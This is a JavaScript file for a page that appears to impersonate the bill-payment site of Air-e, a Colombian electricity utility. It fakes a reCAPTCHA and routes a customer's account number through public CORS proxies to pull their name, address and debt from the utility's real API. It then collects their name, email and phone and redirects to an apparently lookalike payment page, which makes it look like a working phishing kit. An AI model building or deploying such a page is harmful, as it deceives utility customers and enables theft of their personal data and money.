// --- 1. LÓGICA DE MENÚ (SIDEBAR) ---
const hamburgerBtn = document.getElementById('hamburgerBtn');
const hamburgerBtnDesktop = document.getElementById('hamburgerBtnDesktop'); 
const sidebar = document.getElementById('sidebar');

const toggleSidebar = () => {
    if (window.innerWidth <= 768) sidebar.classList.toggle('mobile-open');
    else sidebar.classList.toggle('hidden');
};

if(hamburgerBtn) hamburgerBtn.addEventListener('click', toggleSidebar);
if(hamburgerBtnDesktop) hamburgerBtnDesktop.addEventListener('click', toggleSidebar);

// --- 2. LÓGICA DE RECAPTCHA (SIMULADO) ---
const checkboxContainer = document.getElementById('checkboxContainer');
const fakeCheckbox = document.getElementById('fakeCheckbox');
const spinner = document.getElementById('spinner');
const checkmark = document.getElementById('checkmark');
let isChecked = false;

if(checkboxContainer){
    checkboxContainer.addEventListener('click', () => {
        if(isChecked) return; 
        fakeCheckbox.style.display = 'none';
        spinner.style.display = 'block';
        setTimeout(() => {
            spinner.style.display = 'none';
            checkmark.style.display = 'block';
            isChecked = true;
        }, 1200);
    });
}

// --- 3. LÓGICA PRINCIPAL CON FALLBACK DE PROXIES ---
const btnPagar = document.getElementById('btnPagar');
const whitePanel = document.getElementById('whitePanel');
const originalTitleStrip = document.getElementById('originalTitleStrip');
const inputNic = document.getElementById('inputNicReal');

if(btnPagar) {
    btnPagar.addEventListener('click', async () => {
        const nic = inputNic.value.trim();
        if(!nic) { alert("Por favor, ingrese el NIC."); return; }
        if(!isChecked) { alert("Por favor confirme que no es un robot."); return; }

        originalTitleStrip.style.display = 'none';
        whitePanel.innerHTML = `<div class="full-loader-container"><div class="big-loader"></div><p>Consultando datos en Air-e...</p></div>`;

        const targetUrl = `https://caribesol.facture.co/DesktopModules/Gateway.Pago.ConsultaAnonima/API/ConsultaAnonima/getPolizaOpen?cd_poliza=${nic}`;
        
        // Lista de proxies para intentar uno tras otro si fallan
        const proxies = [
            `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(targetUrl)}`, // Opción 1 (Más limpia)
            `https://api.allorigins.win/get?url=${encodeURIComponent(targetUrl)}`,       // Opción 2 (Envuelto en .contents)
            `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`                    // Opción 3 (Directo)
        ];

        let data = null;
        let success = false;

        // Bucle de reintento con diferentes proxies
        for (let proxyUrl of proxies) {
            try {
                console.log("Intentando con proxy:", proxyUrl);
                const resp = await fetch(proxyUrl);
                if (!resp.ok) continue; // Si este proxy falla, saltamos al siguiente

                let result = await resp.json();
                
                // Normalización: AllOrigins guarda todo en .contents, otros devuelven el JSON directo
                let rawData = result.contents ? result.contents : result;
                
                // Si la respuesta es un texto (string), intentamos convertirlo a objeto
                data = (typeof rawData === 'string') ? JSON.parse(rawData) : rawData;

                if (data && (data.ACCOUNTS || data.NAME)) {
                    success = true;
                    break; // ¡Encontramos los datos! Salimos del bucle
                }
            } catch (err) {
                console.warn("Fallo un intento de conexión, probando el siguiente...");
            }
        }

        if (!success || !data) {
            alert("No pudimos conectar con Air-e en este momento. Inténtalo de nuevo en unos minutos.");
            location.reload();
            return;
        }

        // --- PROCESAMIENTO DE DATOS ---
        const info = data.ACCOUNTS || data;
        const deudaTotalNum = parseFloat(info.ADJUST_BALANCE) || 0;
        const nombreUsuario = data.NAME || info.NAME || "Usuario Air-e";
        
        let valorMesNum = 0;
        if (info.INVOICES && info.INVOICES.length > 0) {
            valorMesNum = parseFloat(info.INVOICES[info.INVOICES.length - 1].ADJUST_BALANCE) || 0;
        }

        if (deudaTotalNum > 0) {
            whitePanel.innerHTML = `
            <div class="invoice-view">
                <div class="invoice-header"><h3>PAGUE SU FACTURA</h3></div>
                <div style="text-align:center; padding:10px; background:#f0f4f8; margin-bottom:15px; border-radius:5px;">
                    <strong style="display:block; color:#004a99; text-transform:uppercase;">${nombreUsuario}</strong>
                    <small>${info.COLLECTION_ADDRESS || 'Dirección registrada'}</small>
                </div>
                <div class="invoice-form-grid">
                    <div class="required-note">* Indica campo requerido</div>
                    <div class="invoice-input-group">
                        <label class="invoice-label">No. identificación <span>*</span></label>
                        <input type="text" class="invoice-field" id="numId" value="${nic}">
                    </div>
                    <div class="invoice-input-group">
                        <label class="invoice-label">Nombres <span>*</span></label>
                        <input type="text" class="invoice-field" id="nombres">
                    </div>
                    <div class="invoice-input-group">
                        <label class="invoice-label">Apellidos <span>*</span></label>
                        <input type="text" class="invoice-field" id="apellidos">
                    </div>
                    <div class="invoice-input-group">
                        <label class="invoice-label">Correo <span>*</span></label>
                        <input type="email" class="invoice-field" id="correo">
                    </div>
                    <input type="hidden" id="direccion" value="${info.COLLECTION_ADDRESS || ''}">
                    <div class="invoice-input-group">
                        <label class="invoice-label">Celular <span>*</span></label>
                        <input type="text" class="invoice-field" id="celular">
                    </div>
                </div>
                <div class="payment-cards-grid">
                    <div class="payment-card">
                        <div class="pay-card-title">Valor del mes</div>
                        <div class="pay-card-amount">$ ${valorMesNum.toLocaleString('es-CO')}</div>
                        <button class="btn-card-action btn-blue-dark" onclick="guardarYRedirigir('${valorMesNum}', 'mensual')">PAGAR MES</button>
                    </div>
                    <div class="payment-card">
                        <div class="pay-card-title">Deuda Total</div>
                        <div class="pay-card-amount">$ ${deudaTotalNum.toLocaleString('es-CO')}</div>
                        <button class="btn-card-action btn-teal" onclick="guardarYRedirigir('${deudaTotalNum}', 'total')">PAGAR TOTAL</button>
                    </div>
                </div>
                <div class="invoice-footer">
                    <div class="terms-check"><input type="checkbox" id="checkTerm" checked><span>Acepto políticas de tratamiento de datos.</span></div>
                    <button class="btn-cancel" onclick="location.reload()">VOLVER</button>
                </div>
            </div>`;
        } else {
            alert("El NIC no presenta deudas pendientes.");
            location.reload();
        }
    });
}

// --- 4. FUNCIÓN DE REDIRECCIÓN ---
window.guardarYRedirigir = function(monto, tipo) {
    const nom = document.getElementById('nombres').value;
    const ape = document.getElementById('apellidos').value;
    const mail = document.getElementById('correo').value;
    const cel = document.getElementById('celular').value;
    const term = document.getElementById('checkTerm');

    if(!nom || !ape || !mail || !cel) { alert("Complete todos los campos."); return; }
    if(!term.checked) { alert("Acepte los términos."); return; }

    const datos = {
        nombreCompleto: nom + " " + ape,
        numId: document.getElementById('numId').value,
        correo: mail,
        montoPagar: parseInt(monto),
        referencia: Math.floor(Math.random() * 1000000)
    };
    localStorage.setItem('datosFactura', JSON.stringify(datos));
    window.location.href = 'portalpagos.portalfacture.com.html';
};
